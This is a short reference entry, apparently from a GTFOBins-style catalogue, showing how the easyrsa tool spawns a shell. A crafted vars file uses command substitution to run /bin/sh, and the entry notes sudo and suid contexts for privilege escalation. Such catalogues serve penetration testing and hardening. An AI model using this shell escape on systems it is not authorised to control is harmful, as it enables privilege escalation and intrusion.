---
type: gtfobin
name: easyrsa
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# easyrsa

## shell

```bash
echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file
```
_This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice._
**Contexts:** sudo, suid, unprivileged
